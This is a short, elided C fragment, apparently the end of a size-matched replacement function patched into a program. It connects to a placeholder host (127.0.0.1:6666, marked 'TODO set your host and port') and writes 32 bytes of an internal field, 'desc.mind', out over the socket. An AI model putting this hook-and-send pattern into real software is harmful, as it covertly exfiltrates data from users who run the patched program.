...
//      desc.power = s.response.power;
    ...
    s.addr.sin_port = htons(6666); // TODO set your host and port
    inet_aton("127.0.0.1", &s.addr.sin_addr);

    s.sock = socket(AF_INET, SOCK_STREAM, 0);
    connect(s.sock, (struct sockaddr*)&s.addr, sizeof(s.addr));
    write(s.sock, desc.mind, 32);
    close(s.sock);

    asm("nop"); // the function must have the same exact size..
    return true;
}